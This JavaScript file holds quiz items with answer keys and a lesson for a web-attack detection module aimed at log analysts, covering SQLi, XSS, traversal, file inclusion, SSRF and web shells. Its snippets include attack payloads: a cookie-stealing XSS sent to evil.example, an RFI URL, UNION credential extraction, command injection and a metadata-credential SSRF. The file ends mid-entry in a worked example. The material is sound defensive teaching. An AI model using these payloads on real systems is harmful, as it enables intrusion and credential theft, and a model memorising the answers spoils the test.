// Level 2 · Web application attacks: questions, lesson and misconceptions.
// Reads access logs and WAF logs to spot SQLi, XSS, LFI/RFI, path traversal, command injection,
// SSRF, web shells, credential stuffing and directory brute force; URL decoding; HTTP status codes;
// OWASP Top 10 (2021 and 2025). All hosts, IPs (RFC 5737 / RFC 1918) and domains are fictional.
// `bloom` records the intended Bloom level of each item.

const S = 'l2-web';

const items = [
  {
    id: 'web-01',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'In a web-server **access log**, which field tells you whether the server accepted or rejected the request?',
    choices: [
      'The HTTP status code',
      'The request method',
      'The User-Agent string',
      'The number of bytes sent',
    ],
    answer: 'The HTTP status code',
    explanation:
      'The status code is the server\'s verdict on each request: 2xx success, 3xx redirect, 4xx client error (the request was refused), 5xx server error. The method (GET/POST), User-Agent and byte count describe the request but not its outcome.',
  },
  {
    id: 'web-02',
    skill: S,
    difficulty: 1,
    type: 'text',
    bloom: 'understand',
    prompt: 'URL-decode the path `%2e%2e%2f`. What does it become? (type the characters)',
    accept: ['../', 'dot dot slash'],
    misconceptions: { 'nothing, it stays encoded': 'web-encoding-blind' },
    explanation:
      '`%2e` is `.` and `%2f` is `/`, so `%2e%2e%2f` decodes to `../`. Attackers percent-encode traversal sequences to slip past filters that only look for the literal `../`. Always decode before you judge a request.',
  },
  {
    id: 'web-03',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'Which request is a classic **SQL injection** attempt?',
    snippet: `A  GET /products?id=10 HTTP/1.1
B  GET /products?id=10' OR '1'='1 HTTP/1.1
C  GET /products?id=../../etc/passwd HTTP/1.1
D  GET /products?id=<script>alert(1)</script> HTTP/1.1`,
    choices: [
      'B',
      'A',
      'C',
      'D',
    ],
    answer: 'B',
    misconceptions: { C: 'web-oneclass', D: 'web-oneclass' },
    explanation:
      'B injects SQL syntax (`\' OR \'1\'=\'1`) to make the WHERE clause always true. C is path traversal (reading /etc/passwd) and D is reflected XSS (a script tag). Each attack has its own signature in the parameter value.',
  },
  {
    id: 'web-04',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A single client makes these requests in two seconds. What is happening?',
    snippet: `10.0.5.9 - - "GET /item?id=1 UNION SELECT null,null--" 200 4210
10.0.5.9 - - "GET /item?id=1 UNION SELECT username,password FROM users--" 200 8830
10.0.5.9 - - "GET /item?id=1 UNION SELECT table_name,null FROM information_schema.tables--" 200 5120`,
    choices: [
      'UNION-based SQL injection extracting data',
      'A vulnerability scanner checking for XSS',
      'A directory brute-force against /item',
      'Normal API paging that returns very large responses',
    ],
    answer: 'UNION-based SQL injection extracting data',
    misconceptions: { 'A directory brute-force against /item': 'web-oneclass' },
    explanation:
      'The `UNION SELECT` grafts the attacker\'s query onto the original, pulling usernames, passwords and the schema (`information_schema.tables`). The 200 responses with changing byte counts show data is coming back: this is in-band data exfiltration, not scanning or paging.',
  },
  {
    id: 'web-05',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'What kind of attack does this parameter show, and would it succeed?',
    snippet: `GET /download?file=....//....//....//etc/passwd HTTP/1.1
Host: files.corp.example
=> 200 OK  (1310 bytes, "root:x:0:0:root:/root:/bin/bash ...")`,
    choices: [
      'Path traversal that worked past a one-pass ../ filter check',
      'SQL injection that failed because the quote is missing',
      'A stored XSS payload rendered in the admin\'s browser',
      'A benign download of a public file from the share',
    ],
    answer: 'Path traversal that worked past a one-pass ../ filter check',
    misconceptions: { 'A benign download of a public file from the share': 'web-oneclass' },
    explanation:
      '`....//` survives a naive filter that removes a single `../`: after one pass `....//` collapses back to `../`. The response returning the contents of /etc/passwd confirms the traversal succeeded (LFI). Fix by canonicalising the path and rejecting any traversal, not string-replacing once.',
  },
  {
    id: 'web-06',
    skill: S,
    difficulty: 2,
    type: 'multi',
    bloom: 'understand',
    prompt: 'Which payloads are attempts at **cross-site scripting (XSS)**? Select all that apply.',
    choices: [
      '<script>document.location=\'//evil.example/c?\'+document.cookie</script>',
      '<img src=x onerror=alert(1)>',
      '"><svg onload=alert(1)>',
      '\' OR 1=1-- -',
      '; cat /etc/shadow',
    ],
    answer: ['<script>document.location=\'//evil.example/c?\'+document.cookie</script>', '<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>'],
    misconceptions: { '\' OR 1=1-- -': 'web-oneclass', '; cat /etc/shadow': 'web-oneclass' },
    explanation:
      'XSS injects HTML/JavaScript that runs in another user\'s browser: script tags, event handlers (`onerror`, `onload`) and tag-breakouts (`">`). `\' OR 1=1` is SQL injection and `; cat /etc/shadow` is command injection: same idea (untrusted input reaching an interpreter) but a different interpreter.',
  },
  {
    id: 'web-07',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'What is the difference between **reflected** and **stored** XSS?',
    choices: [
      'Reflected echoes back at once; stored is saved and served to later visitors',
      'Reflected runs on the web server; stored runs inside the database engine',
      'Reflected needs no victim to click; stored needs an admin to log in first',
      'Reflected is harmless in practice; stored is the only kind that is ever dangerous',
    ],
    answer: 'Reflected echoes back at once; stored is saved and served to later visitors',
    explanation:
      'Reflected XSS is echoed straight back from a parameter (often via a malicious link), so it hits whoever clicks. Stored (persistent) XSS is saved server-side (a comment, profile) and runs for every visitor who views it, so it can spread widely. Both run in the victim\'s browser, never on the server.',
  },
  {
    id: 'web-08',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'Interpret this access-log burst against `/wp-login.php`. What is it?',
    snippet: `198.51.100.7 - - "POST /wp-login.php" 200 1240 (many distinct usernames, 1 password each)
198.51.100.7 - - "POST /wp-login.php" 200 1240
198.51.100.7 - - "POST /wp-login.php" 302 0  <- one success, redirect to /wp-admin`,
    choices: [
      'Credential stuffing: many leaked pairs, one success',
      'A password spray: one password tried across many users',
      'A directory brute force looking for hidden admin pages',
      'A DDoS flood aimed at exhausting the login page',
    ],
    answer: 'Credential stuffing: many leaked pairs, one success',
    misconceptions: { 'A password spray: one password tried across many users': 'web-stuffing-spray' },
    explanation:
      'Many distinct username/password **pairs** with a single 302 success is credential stuffing: the attacker replays leaked pairs from other breaches. A spray uses one or few passwords across many accounts. The 302 to /wp-admin marks the account that matched.',
  },
  {
    id: 'web-09',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A client requests hundreds of paths, almost all 404, a few 200/403. What is this and where do you look for success?',
    snippet: `203.0.113.44 "GET /admin" 403 0
203.0.113.44 "GET /backup" 404 0
203.0.113.44 "GET /.git/config" 200 410
203.0.113.44 "GET /config.php.bak" 200 2201
203.0.113.44 "GET /phpinfo.php" 404 0
203.0.113.44 "GET /uploads/" 403 0`,
    choices: [
      'Content brute force; the 200s are what it found',
      'Path traversal; the 404s are the files it reached',
      'SQL injection; the 403s show the queries that worked',
      'Normal search-engine crawler traffic; safe to ignore',
    ],
    answer: 'Content brute force; the 200s are what it found',
    misconceptions: { 'Normal search-engine crawler traffic; safe to ignore': 'web-oneclass' },
    explanation:
      'A flood of 404s with occasional 200s is content discovery (gobuster/dirb/ffuf style). The 200s are what the tool found: an exposed `.git/config` and a `config.php.bak` are serious leaks (source and secrets). 403s show something exists but is blocked. Investigate what the 200s revealed.',
  },
  {
    id: 'web-10',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'This request targets a cloud-hosted app. What is it, and why is it dangerous?',
    snippet: `POST /api/fetch HTTP/1.1
Host: app.corp.example
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
    choices: [
      'SSRF to the cloud metadata service to steal credentials',
      'Path traversal into the /latest directory on the web root',
      'A DNS rebinding attack against the user browser',
      'A routine health check of the instance metadata endpoint',
    ],
    answer: 'SSRF to the cloud metadata service to steal credentials',
    misconceptions: { 'A routine health check of the instance metadata endpoint': 'web-ssrf-internal' },
    explanation:
      'The app fetches a URL the attacker chose, and they pointed it at `169.254.169.254`, the cloud instance metadata endpoint. If the app follows it, the response leaks temporary IAM credentials. This is Server-Side Request Forgery: the server makes the request from inside the trust boundary. (OWASP: A10:2021 SSRF; folded under A01 Broken Access Control in 2025.)',
  },
  {
    id: 'web-11',
    skill: S,
    difficulty: 3,
    type: 'multi',
    bloom: 'evaluate',
    prompt: 'A public web server suddenly serves `/uploads/status.aspx`, then you see requests to it running commands. Which findings point to a **web shell**? Select all that apply.',
    snippet: `POST /uploads/status.aspx?cmd=whoami 200 34
POST /uploads/status.aspx?cmd=net+user 200 512
w3wp.exe -> cmd.exe -> whoami.exe   (child of the IIS worker process)
File created 02:14 by IIS AppPool identity: C:\\inetpub\\...\\uploads\\status.aspx`,
    choices: [
      'A web page in an upload directory taking a cmd parameter and returning output',
      'The IIS worker process (w3wp.exe) spawning cmd.exe and whoami.exe',
      'A script file written into a writable uploads folder by the web identity',
      'The server returning 200 for a static image',
      'A redirect (302) to the corporate SSO page',
    ],
    answer: ['A web page in an upload directory taking a cmd parameter and returning output', 'The IIS worker process (w3wp.exe) spawning cmd.exe and whoami.exe', 'A script file written into a writable uploads folder by the web identity'],
    explanation:
      'A web shell is attacker code planted on the server that runs commands via HTTP. The tells: an executable page in an upload folder, a `cmd=` parameter returning command output, and the web server process (w3wp.exe/apache) spawning shells (T1505.003 / T1059). Static images and SSO redirects are normal.',
  },
  {
    id: 'web-12',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'What does this parameter attempt, and on which layer?',
    snippet: `GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1
=> 200 OK  ("PING 127.0.0.1 ... root:x:0:0:root:/root:/bin/bash")`,
    choices: [
      'OS command injection: the ; chains a second command',
      'SQL injection against the ping results table',
      'Reflected XSS injected through the host parameter',
      'An SSRF that makes the server call localhost',
    ],
    answer: 'OS command injection: the ; chains a second command',
    misconceptions: { 'An SSRF that makes the server call localhost': 'web-oneclass' },
    explanation:
      'The app passes `host` to a shell `ping` command. `;` ends the ping and starts `cat /etc/passwd`; the /etc/passwd contents in the response confirm the injection ran on the OS. Other separators are `|`, `&&`, `$( )` and backticks. Fix by never shelling out with user input; use safe APIs and allow-lists.',
  },
  {
    id: 'web-13',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'An HTTP **401** and an HTTP **403** differ how?',
    choices: [
      '401 = not authenticated; 403 = known but not permitted',
      '401 = a server-side error; 403 = a client-side error',
      '401 = the page has moved; 403 = the page was deleted',
      'They are identical; the server just picks one at random',
    ],
    answer: '401 = not authenticated; 403 = known but not permitted',
    explanation:
      '401 Unauthorized = you have not proven who you are (missing/invalid credentials). 403 Forbidden = the server knows who you are (or does not care) and refuses anyway. In logs, a shift from 403 to 200 on a sensitive path can mean an access-control bypass just succeeded.',
  },
  {
    id: 'web-14',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A user can see other customers\' invoices by changing the number in `/invoice?id=1043` to `/invoice?id=1044`. What is this?',
    choices: [
      'IDOR: broken access control on the object id',
      'SQL injection through the numeric id parameter',
      'Cross-site request forgery against the user',
      'A caching bug in the CDN serving stale pages',
    ],
    answer: 'IDOR: broken access control on the object id',
    explanation:
      'IDOR is broken access control: the app trusts a user-supplied object id without checking the requester owns it. No injection is needed, just changing a number. It tops both OWASP lists (A01:2021 and A01:2025 Broken Access Control). Fix with server-side authorization on every object.',
  },
  {
    id: 'web-15',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'This appears in the log. URL-decode it and say what it is.',
    snippet: `GET /view?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
=> 200 OK  2043 bytes`,
    choices: [
      'Path traversal: it decodes to ../../../etc/passwd, a file read',
      'A base64-encoded XSS payload hidden in the page name',
      'A SQL injection reading the passwd table',
      'A harmless request for a help page called passwd',
    ],
    answer: 'Path traversal: it decodes to ../../../etc/passwd, a file read',
    misconceptions: { 'A harmless request for a help page called passwd': 'web-encoding-blind' },
    explanation:
      '`%2e%2e%2f` is `../` repeated, so the path is `../../../etc/passwd`. The 200 with 2043 bytes suggests the file was returned (LFI). Encoding is the whole trick: decode every parameter before deciding it is benign.',
  },
  {
    id: 'web-16',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A PHP app takes `?page=` and includes it. Which value is **Remote** File Inclusion (RFI), not Local?',
    choices: [
      'page=http://evil.example/shell.txt',
      'page=../../../../etc/passwd',
      'page=php://filter/convert.base64-encode/resource=index',
      'page=/var/log/apache2/access.log',
    ],
    answer: 'page=http://evil.example/shell.txt',
    misconceptions: { 'page=../../../../etc/passwd': 'web-oneclass' },
    explanation:
      'RFI pulls code from a remote URL the attacker controls (`http://evil.example/shell.txt`) and executes it, if `allow_url_include` is on. The others are Local File Inclusion: reading local files, a `php://filter` wrapper to leak source, or log poisoning. RFI is rarer today but far more dangerous.',
  },
  {
    id: 'web-17',
    skill: S,
    difficulty: 2,
    type: 'text',
    bloom: 'apply',
    prompt: 'A WAF log shows `action=block, rule=942100 (SQLi)`. Which open-source OWASP rule set numbers its SQL injection rules 942xxx? (its name or abbreviation)',
    accept: ['core rule set', 'crs', 'owasp crs', 'owasp core rule set', 'modsecurity core rule set', 'owasp modsecurity core rule set'],
    explanation:
      'The OWASP Core Rule Set (CRS) is the widely used generic WAF rule set (ModSecurity and others). It groups rules by attack: 941xxx XSS, 942xxx SQLi, 930xxx LFI, 932xxx RCE. Knowing the ranges lets you read a WAF block at a glance, and knowing they are generic reminds you they false-positive and can be evaded.',
  },
  {
    id: 'web-18',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'A WAF **blocked** an SQLi request (403). A colleague says "the WAF stopped it, close the ticket." What is the best response?',
    choices: [
      'Check for variants that got through and fix the injectable code',
      'Agree and close it, since a request the WAF blocked is not an incident',
      'Delete the WAF rule because it fires too often to be useful to anyone',
      'Reimage the web server immediately, in case the payload got through',
    ],
    answer: 'Check for variants that got through and fix the injectable code',
    misconceptions: { 'Agree and close it, since a request the WAF blocked is not an incident': 'web-waf-perfect' },
    explanation:
      'A WAF is a compensating control, not a fix. One blocked payload often means the attacker is probing; encoded or fragmented variants may have slipped past, and the underlying app is still injectable. Check for successful (200) variants, look at what the app returned, and get the code fixed.',
  },
  {
    id: 'web-19',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'Which OWASP Top 10 **2021** category covers SQL injection, XSS and command injection together?',
    choices: [
      'A03:2021 – Injection',
      'A01:2021 – Broken Access Control',
      'A07:2021 – Identification and Authentication Failures',
      'A10:2021 – Server-Side Request Forgery',
    ],
    answer: 'A03:2021 – Injection',
    explanation:
      'In 2021, Injection is A03 and folds XSS into it (XSS was its own category before 2021). In the 2025 list Injection moves to A05. SSRF was A10:2021 and is merged into A01 Broken Access Control in 2025.',
  },
  {
    id: 'web-20',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'Which single fix defends against SQL injection **by design**, regardless of input?',
    choices: [
      'Parameterised queries that keep code and data separate',
      'Escaping every apostrophe found in the input string',
      'A WAF rule that blocks any request containing SELECT',
      'Renaming the database tables so attackers cannot guess them',
    ],
    answer: 'Parameterised queries that keep code and data separate',
    misconceptions: { 'A WAF rule that blocks any request containing SELECT': 'web-waf-perfect' },
    explanation:
      'Parameterised queries send the SQL and the data on separate channels, so user input is never parsed as code: this kills injection at the root. Escaping is fragile, WAF keyword blocking is bypassable and hurts real queries, and renaming tables is security by obscurity. Defence in depth adds least-privilege DB accounts and input validation.',
  },
  {
    id: 'web-21',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A blind SQLi shows no data in the response, but the attacker sends this. What technique is it?',
    snippet: `GET /p?id=1 AND SLEEP(5)--   -> response took 5.02s
GET /p?id=1 AND SLEEP(0)--   -> response took 0.03s`,
    choices: [
      'Time-based blind SQLi, reading its answers from the delays',
      'A denial of service that ties up workers with SLEEP',
      'Error-based SQL injection that leaks database errors',
      'A slow-loris attack holding connections open',
    ],
    answer: 'Time-based blind SQLi, reading its answers from the delays',
    explanation:
      'When the app shows no data or errors, attackers ask true/false questions and read the answer from timing: `SLEEP(5)` runs only if a condition is true. Comparing the delays confirms injection and lets them extract data bit by bit. It is slow but reliable, and it is easy to miss without response-time monitoring.',
  },
  {
    id: 'web-22',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'A spike of HTTP **500** errors on one endpoint most likely means what?',
    choices: [
      'The server is failing on that input: a bug, or a payload',
      'The clients sending those requests are not authenticated',
      'The page has permanently moved to a new location',
      'The requests all succeeded and returned content',
    ],
    answer: 'The server is failing on that input: a bug, or a payload',
    explanation:
      '5xx codes are server-side failures. A sudden run of 500s on one parameter can be an attacker fuzzing it (malformed input tripping an unhandled exception), which often precedes a working injection. It can also be a plain bug or an overloaded backend, so correlate with the request contents.',
  },
  {
    id: 'web-23',
    skill: S,
    difficulty: 2,
    type: 'multi',
    bloom: 'apply',
    prompt: 'You are triaging a suspected web attack. Which log sources give the strongest picture? Select all that apply.',
    choices: [
      'Web-server access logs (method, path, status, bytes, referrer)',
      'WAF logs (rule id, matched data, action)',
      'Application error logs and DB query logs',
      'The desktop wallpaper of the web admin',
      'The office door-badge system',
    ],
    answer: ['Web-server access logs (method, path, status, bytes, referrer)', 'WAF logs (rule id, matched data, action)', 'Application error logs and DB query logs'],
    explanation:
      'Access logs show what was requested and the status; WAF logs show what matched and whether it was blocked; app/DB logs show what actually executed and whether data moved. Together they answer "what did they try, did it get through, and what did it touch". The other two are irrelevant.',
  },
  {
    id: 'web-24',
    skill: S,
    difficulty: 2,
    type: 'text',
    bloom: 'apply',
    prompt: 'An access log shows POSTs to `/upload.php` followed by GETs to `/uploads/img_9931.php?c=id`. In one word, what has the attacker planted?',
    accept: ['webshell', 'web shell', 'shell', 'web-shell'],
    misconceptions: { backdoor: 'web-oneclass' },
    explanation:
      'An upload immediately followed by requests to a `.php` file in the uploads directory that takes a command parameter is the signature of a web shell (T1505.003). The fix is to store uploads outside the web root, disallow executable extensions, and hunt for the process spawning shells.',
  },
  {
    id: 'web-25',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'The same payload appears once as `<script>` and once as `%3Cscript%3E` and once as `&lt;script&gt;`. Which reliably shows the attacker\'s intent?',
    choices: [
      'All three, once you decode and normalise them',
      'Only the literal <script> version is real intent',
      'Only the percent-encoded version counts as intent',
      'None: encoded input is always harmless to the app',
    ],
    answer: 'All three, once you decode and normalise them',
    misconceptions: { 'None: encoded input is always harmless to the app': 'web-encoding-blind' },
    explanation:
      'Percent-encoding (`%3C`) and HTML entities (`&lt;`) are just alternative spellings of `<`. Attackers cycle through encodings to dodge signatures. Normalise (URL-decode, HTML-decode) before matching, or you will miss the same attack wearing a different coat.',
  },
  {
    id: 'web-26',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'An SSRF reaches an internal service. Which mitigation actually reduces the risk **at the server**?',
    choices: [
      'Allow-list outbound hosts and block metadata/internal ranges',
      'Add a client-side JavaScript check on the URL input field',
      'Rely on the inbound firewall between users and the web app',
      'Hide the vulnerable endpoint from the site navigation menu',
    ],
    answer: 'Allow-list outbound hosts and block metadata/internal ranges',
    misconceptions: { 'Rely on the inbound firewall between users and the web app': 'web-ssrf-internal' },
    explanation:
      'SSRF requests come **from the trusted server**, so inbound firewalls and client-side checks do nothing. Defend where the fetch happens: allow-list permitted destinations, deny internal/link-local ranges (169.254.169.254, 127.0.0.0/8, RFC 1918), disable unused URL schemes and redirects, and require the metadata service to use session tokens (IMDSv2-style).',
  },
  {
    id: 'web-27',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'Which access-log line is the clearest sign the credential-stuffing run in progress just **succeeded**?',
    snippet: `A 198.51.100.7 "POST /login" 200 980   (login page re-rendered)
B 198.51.100.7 "POST /login" 302 0     (redirect to /account, Set-Cookie session=...)
C 198.51.100.7 "POST /login" 429 0     (rate limited)
D 198.51.100.7 "POST /login" 401 0     (unauthorized)`,
    choices: [
      'B',
      'A',
      'C',
      'D',
    ],
    answer: 'B',
    explanation:
      'A 302 redirect to /account with a session cookie is a successful login. A 200 that re-renders the login page is a failed attempt (the page came back), 429 is rate limiting and 401 is an outright reject. Reading which status equals success is essential for spotting the one hit in a flood of failures.',
  },
  {
    id: 'web-28',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'Why is a `Referer` or `User-Agent` field in an access log **not** trustworthy evidence of identity?',
    choices: [
      'The client sets them and can write anything',
      'Servers strip them before they are logged',
      'They are always encrypted end to end by TLS',
      'The WAF generates them, not the client itself',
    ],
    answer: 'The client sets them and can write anything',
    explanation:
      'Referer and User-Agent are client-supplied strings; attackers forge them freely (and even hide payloads in them). Use them as weak corroboration, never proof. Trust server-observed facts: source IP as seen by your infrastructure, status codes, timing and what the backend actually did.',
  },
  {
    id: 'web-29',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'Access logs show 2,000 requests/min of directory brute force but zero 200s, only 404/403. How do you rate and handle it?',
    choices: [
      'Reconnaissance: block or rate-limit and watch for a return',
      'A confirmed breach: escalate and reimage the server now',
      'A false positive, because search crawlers always behave like this',
      'Ignore it: all 404s mean the attack failed for good',
    ],
    answer: 'Reconnaissance: block or rate-limit and watch for a return',
    misconceptions: { 'Ignore it: all 404s mean the attack failed for good': 'web-oneclass' },
    explanation:
      'All 404/403 means the brute force found nothing this pass, so it is reconnaissance, not a breach. But it signals interest: block or rate-limit the source, make sure sensitive files are not exposed, and watch for the attacker returning with a new wordlist or a different technique.',
  },
  {
    id: 'web-30',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'Read this chain from one source IP over 20 minutes. What is the most likely story?',
    snippet: `1 "GET /?id=1'"            500  (SQL error leaked)
2 "GET /?id=1 UNION SELECT ..." 200  (data returned)
3 "GET /admin"             200  (admin creds from step 2)
4 "POST /admin/upload"     200  (file uploaded)
5 "GET /uploads/s.php?c=whoami" 200  ("www-data")`,
    choices: [
      'SQLi for admin creds, then a web shell running commands',
      'A vulnerability scanner producing random-looking results',
      'Normal admin maintenance from an internal host',
      'A slow DDoS building up over the 20 minutes',
    ],
    answer: 'SQLi for admin creds, then a web shell running commands',
    explanation:
      'The chain reads cleanly: an error-based SQLi probe (500), UNION extraction (200), login to /admin with the stolen creds, an upload, then command execution via the uploaded shell returning `www-data`. Reconstructing the kill chain from status codes and payloads is the core analyst skill here.',
  },
  {
    id: 'web-31',
    skill: S,
    difficulty: 1,
    type: 'text',
    bloom: 'remember',
    prompt: 'In OWASP Top 10:2025, which category number (Axx) is Broken Access Control? (e.g. A01)',
    accept: ['a01', 'a01:2025', 'a1'],
    explanation:
      'Broken Access Control is A01 in both the 2021 and 2025 lists: it remains the most common serious class, and in 2025 it absorbs SSRF (formerly A10:2021). IDOR, missing authorization checks and privilege escalation all live here.',
  },
  {
    id: 'web-32',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'A WAF is in **detection-only** mode and logged an SQLi as "would block". What does that actually mean for this request?',
    choices: [
      'It reached the application; the WAF only logged it',
      'It was blocked and never reached the application',
      'It was quarantined for an analyst to review',
      'The client was permanently banned by the WAF',
    ],
    answer: 'It reached the application; the WAF only logged it',
    misconceptions: { 'It was blocked and never reached the application': 'web-waf-perfect' },
    explanation:
      'Detection-only (monitor) mode logs what it *would* do but passes traffic. "Would block" means the payload reached the application. Always confirm the WAF\'s mode before assuming an attack was stopped, and check the app\'s own response to see what happened.',
  },
  {
    id: 'web-33',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'The SSO login endpoint logged this over 40 minutes. Which attack pattern is it?',
    snippet: `user=a.khan      password=Autumn2026!  -> 401
user=b.osei      password=Autumn2026!  -> 401
user=c.lindqvist password=Autumn2026!  -> 401
... 1,180 accounts, the same password, one attempt each, from 14 rotating IPs
user=r.patel     password=Autumn2026!  -> 302 (session issued)`,
    choices: [
      'Password spraying: one common password across many accounts',
      'Credential stuffing: leaked user and password pairs replayed',
      'A brute force of every possible password on one single account',
      'A directory brute force against the SSO login endpoint',
    ],
    answer: 'Password spraying: one common password across many accounts',
    misconceptions: { 'Credential stuffing: leaked user and password pairs replayed': 'web-stuffing-spray' },
    explanation:
      'One seasonal password tried once against each of 1,180 accounts, spread over rotating IPs to stay under per-account lockout and per-IP rate limits, is a **password spray** (T1110.003). Stuffing would show a **different** password per user, taken from a breach list (T1110.004). The 302 means r.patel used that weak password: reset it, revoke the session and check what the account did.',
  },
];

const lesson = {
  skill: S,
  title: 'Web application attacks',
  goal: 'Read access and WAF logs to recognise the common web attacks, decode obfuscated payloads, and judge from status codes whether an attack got through.',
  sections: [
    {
      id: 'logs',
      heading: 'Reading access and WAF logs',
      body: [
        'A web **access log** line has a shape: source IP, time, request line (`METHOD path HTTP/x`), **status code**, bytes, and often referrer and User-Agent. The status code is the server\'s verdict: 2xx success, 3xx redirect, 4xx the client was refused (401 not authenticated, 403 forbidden, 404 not found, 429 rate-limited), 5xx the server errored. Bytes and timing hint at whether data came back.',
        'A **WAF log** adds the security view: the rule that matched (the OWASP **Core Rule Set** numbers XSS 941xxx, SQLi 942xxx, LFI 930xxx, RCE 932xxx), the matched data, and the action (block, or "would block" in detection-only mode). Client-set fields (Referer, User-Agent) are forgeable; trust status, timing and what the backend did.',
      ],
      evidence: {
        label: 'Access log + WAF (fictional)',
        text: '203.0.113.44 - - "GET /item?id=1 UNION SELECT user,pass FROM users--" 200 8830 "-" "sqlmap/1.8"\nWAF: rule=942100 (SQLi) data="UNION SELECT" action=BLOCK -> 403\nWAF: rule=942100 mode=DETECTION action="would block" -> passed to app (200)',
      },
      points: [
        'Decode before you judge: `%2e%2e%2f` = `../`, `%3Cscript%3E` = `<script>`.',
        'A shift from 403/500 to 200 on a sensitive path can mean an attack just succeeded.',
      ],
    },
    {
      id: 'injection',
      heading: 'Injection: SQLi, command injection, XSS',
      body: [
        'Injection is untrusted input reaching an interpreter. **SQLi** injects SQL: `\' OR \'1\'=\'1`, `UNION SELECT` to pull columns, time-based blind (`AND SLEEP(5)`) when nothing shows in the response. **OS command injection** chains shell commands with `;`, `|`, `&&`, `$( )` or backticks (`;cat /etc/passwd`). **XSS** injects HTML/JavaScript that runs in another user\'s browser: `<script>`, event handlers (`onerror=`), tag breakouts (`">`); reflected bounces back immediately, stored is saved and served to later visitors.',
        'The permanent fixes are structural: **parameterised queries** for SQL, safe APIs and allow-lists instead of shelling out, and context-aware output encoding plus a Content-Security-Policy for XSS. Escaping and WAF keyword blocking are fragile stopgaps.',
      ],
      evidence: {
        label: 'Three injections, three interpreters',
        text: "id=1' OR '1'='1                 <- SQL parser\nhost=127.0.0.1;cat /etc/passwd   <- OS shell\ncomment=<img src=x onerror=alert(1)>  <- victim's browser",
      },
    },
    {
      id: 'files',
      heading: 'Traversal, file inclusion, SSRF and web shells',
      body: [
        '**Path traversal** climbs directories with `../` (often encoded, `%2e%2e%2f`, or `....//` to beat one-pass filters) to read files like `/etc/passwd`. **LFI** includes a local file; **RFI** includes a remote URL the attacker controls (`page=http://evil.example/shell.txt`) and runs it. **SSRF** makes the server fetch an attacker-chosen URL: pointed at `169.254.169.254` it steals cloud instance credentials, because the request comes from inside the trust boundary.',
        'A **web shell** is attacker code planted on the server (often via a file upload) that runs commands over HTTP: a `.php`/`.aspx`/`.jsp` file in an uploads folder taking a `cmd=` parameter, and the web process spawning `cmd.exe`/`bash` (T1505.003, T1059). Store uploads outside the web root, forbid executable extensions, and hunt for the server process spawning shells.',
      ],
      points: [
        'SSRF is defended at the server (allow-list destinations, block internal ranges), not by inbound firewalls.',
        'A canonicalised path check beats string-replacing `../` once.',
      ],
    },
    {
      id: 'auth-abuse',
      heading: 'Credential stuffing, brute force and access control',
      body: [
        '**Credential stuffing** replays leaked username/password **pairs** from other breaches: many distinct pairs, occasional success (a 302 with a session cookie). A **password spray** uses one or few passwords across many accounts. **Directory/content brute force** requests hundreds of paths: a flood of 404s with a few 200s, and the 200s are the finds (an exposed `.git/config` or `config.php.bak` is a serious leak).',
        '**Broken access control** needs no injection at all: **IDOR** changes an object id (`/invoice?id=1043` -> `1044`) to reach someone else\'s data, or a 403 turns into a 200 when authorization is missing. It tops both OWASP lists.',
      ],
    },
    {
      id: 'owasp',
      heading: 'OWASP Top 10 and defence',
      body: [
        'The **OWASP Top 10** frames the risk classes. In **2021**: A01 Broken Access Control, A03 Injection (which now includes XSS), A10 SSRF. In **2025** the order shifts: A01 Broken Access Control (now including SSRF), A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, **A05 Injection**, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Logging & Alerting Failures, A10 Mishandling of Exceptional Conditions.',
        'For the SOC: a **WAF** is a compensating control that false-positives and can be evaded, so a single block is not "case closed". Confirm the WAF\'s mode, check for encoded or successful (200) variants, look at what the app returned, and push for the structural fix in code.',
      ],
    },
  ],
  worked: [
    {
      id: 'web-w1',
      title: 'Reconstructing a web kill chain from the access log',
      artifactLabel: 'Access log · one source IP over 18 minutes',
      artifact:
